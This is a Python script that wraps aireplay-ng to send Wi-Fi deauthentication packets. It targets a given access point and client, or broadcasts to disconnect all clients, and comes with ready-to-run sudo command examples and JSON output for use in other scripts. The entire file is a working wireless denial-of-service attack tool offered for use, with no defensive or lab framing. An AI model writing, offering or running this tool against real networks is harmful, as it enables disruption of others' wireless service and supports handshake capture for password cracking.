#!/usr/bin/env python3
"""
Performs a deauthentication attack using aireplay-ng.

This module sends deauthentication packets to a target client from a specified
access point (BSSID) using a given wireless interface. It can be run as a
standalone script or its main function can be imported.

Required System Dependencies:
- aircrack-ng (specifically aireplay-ng utility)

Usage (as script):
    python3 deauth_attack.py <target_bssid> <client_mac> [--count <num_packets>] [--interface <iface>]
"""
import subprocess
import json
import argparse
from datetime import datetime
from typing import Dict, Any, Union

def send_deauth_packets(
    target_bssid: str,
    client_mac: str,
    interface: str = "wlan0mon",
    count: int = 10,
    timeout_duration: int = 30
) -> str:
    """
    Sends deauthentication packets using aireplay-ng.

    Args:
        target_bssid: The BSSID of the target access point.
        client_mac: The MAC address of the client to deauthenticate.
                      Use 'FF:FF:FF:FF:FF:FF' for a broadcast deauth from the AP.
        interface: The wireless interface to use (must be in monitor mode).
        count: The number of deauthentication packets to send.
        timeout_duration: Timeout in seconds for the aireplay-ng command.

    Returns:
        A JSON string containing the timestamp, status, and output/errors
        of the operation.
    """
    command = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", target_bssid,
        "-c", client_mac,
        interface
    ]
    timestamp = datetime.now().isoformat()

    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True,  # Raise CalledProcessError for non-zero exit codes
            timeout=timeout_duration
        )
        return json.dumps({
            "timestamp": timestamp,
            "status": "success",
            "command": command,
            "output": result.stdout.strip(),
            "errors": result.stderr.strip()
        })
    except subprocess.CalledProcessError as e:
        return json.dumps({
            "timestamp": timestamp,
            "status": "error",
            "command": command,
            "message": f"aireplay-ng exited with error code {e.returncode}",
            "output": e.stdout.strip() if e.stdout else "",
            "errors": e.stderr.strip() if e.stderr else "No stderr output."
        })
    except subprocess.TimeoutExpired as e:
        return json.dumps({
            "timestamp": timestamp,
            "status": "error",
            "command": command,
            "message": f"aireplay-ng command timed out after {timeout_duration} seconds.",
            "output": e.stdout.decode(errors='ignore').strip() if e.stdout else "",
            "errors": e.stderr.decode(errors='ignore').strip() if e.stderr else "No stderr output on timeout."
        })
    except FileNotFoundError:
        return json.dumps({
            "timestamp": timestamp,
            "status": "error",
            "command": command,
            "message": "aireplay-ng command not found. Is aircrack-ng installed and in PATH?",
            "output": "",
            "errors": "Command not found."
        })
    except Exception as e: # Catch any other unexpected exceptions
        return json.dumps({
            "timestamp": timestamp,
            "status": "error",
            "command": command,
            "message": f"An unexpected error occurred: {str(e)}",
            "output": "",
            "errors": str(e)
        })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Send deauthentication packets using aireplay-ng.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""\
Example:
  sudo python3 deauth_attack.py 00:11:22:33:44:55 AA:BB:CC:DD:EE:FF --count 20 --interface wlan0mon
  (Sends 20 deauth packets to client AA:BB:CC:DD:EE:FF from AP 00:11:22:33:44:55)

  sudo python3 deauth_attack.py 00:11:22:33:44:55 FF:FF:FF:FF:FF:FF --interface wlan0mon
  (Sends broadcast deauth from AP 00:11:22:33:44:55 to all its clients)
"""
    )
    parser.add_argument(
        "target_bssid",
        help="BSSID of the target Access Point (e.g., 00:11:22:33:44:55)."
    )
    parser.add_argument(
        "client_mac",
        help="MAC address of the client to deauthenticate (e.g., AA:BB:CC:DD:EE:FF).\n"
             "Use 'FF:FF:FF:FF:FF:FF' to deauthenticate all clients from the target_bssid."
    )
    parser.add_argument(
        "--count",
        type=int,
        default=10,
        help="Number of deauthentication packets to send (default: 10)."
    )
    parser.add_argument(
        "--interface",
        default="wlan0mon",
        help="Wireless interface in monitor mode (default: wlan0mon)."
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Timeout in seconds for the aireplay-ng command (default: 30)."
    )

    args = parser.parse_args()

    # Initial status message (optional, but can be useful for CLI calls)
    # print(json.dumps({
    #     "timestamp": datetime.now().isoformat(),
    #     "status": "starting",
    #     "message": f"Launching deauth attack on BSSID {args.target_bssid}, client {args.client_mac} via {args.interface}..."
    # }))

    result_json = send_deauth_packets(
        target_bssid=args.target_bssid,
        client_mac=args.client_mac,
        interface=args.interface,
        count=args.count,
        timeout_duration=args.timeout
    )
    print(result_json)

    # Exit with error code if the script itself failed before calling aireplay-ng (handled by argparse)
    # or if aireplay-ng call resulted in an error status in JSON.
    try:
        result_data = json.loads(result_json)
        if result_data.get("status") != "success":
            # Consider exiting with 1 if the operation wasn't a success,
            # to make scripting easier for callers.
            # For now, just printing JSON is the primary contract.
            # For a CLI tool, you might: sys.exit(1)
            pass
    except json.JSONDecodeError:
        # Should not happen if send_deauth_packets always returns valid JSON
        # sys.exit(1)
        pass
